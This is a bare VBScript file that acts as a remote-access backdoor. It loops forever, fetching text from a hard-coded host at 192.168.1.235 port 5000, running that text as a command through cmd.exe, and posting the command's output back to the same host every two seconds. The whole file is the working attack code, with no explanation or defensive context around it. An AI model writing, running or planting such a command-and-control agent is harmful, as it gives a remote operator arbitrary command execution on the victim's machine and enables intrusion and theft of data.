URL = "http://192.168.1.235:5000"
dim xHttp, objShell, objCmdExec

Set xHttp = createobject("MSXML2.ServerXMLHTTP")
Set objShell = CreateObject("WScript.Shell")

Do While True
    xHttp.Open "GET", URL, False
    xHttp.Send
    url_cmd = xHttp.responseText

    Set objCmdExec = objshell.exec("cmd.exe /C " & url_cmd)
    url_cmd_return = objCmdExec.StdOut.ReadAll

    xHttp.Open "POST", URL, False
    xHttp.Send url_cmd_return
    WScript.Sleep(2000)
Loop
